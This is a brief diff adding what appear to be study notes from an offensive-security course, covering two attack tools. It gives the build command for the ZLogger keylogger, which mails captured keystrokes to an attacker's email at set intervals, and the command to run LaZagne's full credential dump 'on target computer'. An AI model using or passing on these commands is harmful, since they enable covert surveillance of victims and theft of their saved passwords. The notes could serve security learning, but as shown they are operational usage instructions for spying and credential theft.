@@ -1,0 +1,15 @@
+KeyLogger:
+    https://github.com/z00z/ZLogger
+
+    create a fake email address to get updates every # seconds
+
+    Usage:
+        sudo python zlogger.py -i 60 -w -e <email>> -p <app password> -o keylogger
+        - is very detectable but a good example
+
+        the executable will be in dist folder in zlogger 
+
+LazaGne (a password recovery tool):
+    https://github.com/0x0ff537/LaZagne/
+
+    LaZagne.exe all - on target computer
